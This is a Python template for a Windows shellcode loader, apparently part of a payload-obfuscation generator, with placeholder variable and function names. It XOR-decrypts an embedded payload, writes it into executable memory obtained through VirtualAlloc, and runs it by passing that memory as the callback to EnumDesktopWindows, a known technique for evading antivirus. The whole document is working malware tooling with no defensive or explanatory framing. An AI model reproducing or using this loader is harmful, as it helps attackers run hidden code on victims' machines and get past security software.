#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys, os, time, base64, ctypes, ctypes.wintypes
{{PRE_CHECKS}}
# === Encrypted Payload ===
{{V_KEY}} = base64.b64decode("{{XOR_KEY_B64}}")
{{PAYLOAD_BLOCK}}

def {{FN_DECRYPT}}(data, key):
    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

def {{FN_EXECUTE}}():
    {{V_BUF}} = {{FN_DECRYPT}}({{V_ENC}}, {{V_KEY}})

    k32 = ctypes.windll.kernel32
    u32 = ctypes.windll.user32

    k32.VirtualAlloc.restype = ctypes.c_void_p
    k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
    {{V_PTR}} = k32.VirtualAlloc(None, len({{V_BUF}}), 0x3000, 0x40)
    if not {{V_PTR}}:
        return

    ctypes.memmove({{V_PTR}}, {{V_BUF}}, len({{V_BUF}}))

    WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    {{V_HT}} = WNDENUMPROC({{V_PTR}})
    u32.EnumDesktopWindows(None, {{V_HT}}, None)

if __name__ == "__main__":
    {{FN_EXECUTE}}()
